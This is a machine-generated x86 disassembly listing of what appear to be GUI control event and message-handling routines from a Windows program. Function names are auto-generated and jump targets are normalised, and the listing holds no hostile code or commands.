jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_44e7e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44e81c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_44e8b4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_464dc0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_464dc0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_44d1d4
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46e664
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403370
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_464ce4
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403370
jmp r-xdata
sub_44ea48
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4087c0
mov edi eax
mov eax [ esi + 0x64 ]
call sub_4087ec
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_44d1d4
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408618
call sub_408588
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408588
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_44eaf0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_44eb20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_44eae4
push ebp
call sub_44eaf0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44eb70
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_44ebfc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_44ec34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44e6b4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_464c54
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403370
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_464c54
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403370
sub_44ecb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44d1a4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44d86c
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_44ec34
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_44ed04
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44d1a4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44ed20
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44d1a4
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44d86c
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44ec34
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403370
sub_44ed78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_44e654
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44e5e8
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44e654
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_44ee14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44ec34
pop esi
pop ebx
retn
sub_44ee39
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44ec34
pop esi
pop ebx
retn
sub_44ee5f
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44ec34
pop esi
pop ebx
retn
sub_44ee89
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44ec34
pop esi
pop ebx
retn
sub_44eeb4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_44eee4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_44e6b4
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_464c54
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403370
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_464c54
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403370
sub_44ef5c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_44ef94
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_464c54
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403370
sub_44efcc
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_44d86c
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44ef94
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406a9c
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403370
sub_44f044
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44ef94
pop esi
pop ebx
retn
sub_44f064
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44ef94
pop esi
pop ebx
retn
sub_44f084
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_464c54
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403370
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_4587d8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f0dc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44d85c
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_44d86c
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_44e7e8
pop esi
retn
sub_44f11c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_44e81c
sub_44f1ca
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_44da7c
mov cl 0x1
sub_44f20c
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_44d7d4
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44d7d4
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_44f23c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_44f260
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406a9c
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403370
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_44e7e8
mov [ ebx + 0xc ] eax
sub_44f304
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44d728
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44d728
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_44f398
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4030bc
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_44cdc8
mov edx [ esp ]
mov eax esi
call sub_44cda4
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_44d050
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_44d094
sub_44f41c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_416c28
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_44d14c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_416c78
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44cff4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f4a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44f398
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_453e1c
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_44f41c
pop ecx
jmp r-xdata
sub_44f508
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44f5f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f5fd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44d664
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44d634
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44d634
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4042f8
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403f40
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44d554
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44f604
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403370
sub_44f630
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f650
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f670
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f690
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f6b0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f6d0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f6f0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420e18
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_44cc88
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403370
sub_44f728
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f7c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418c54
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_459fe4
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_45a11c
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d634
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_459e7c
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_45a23c
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f7cb
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_44f7d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_44f810
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
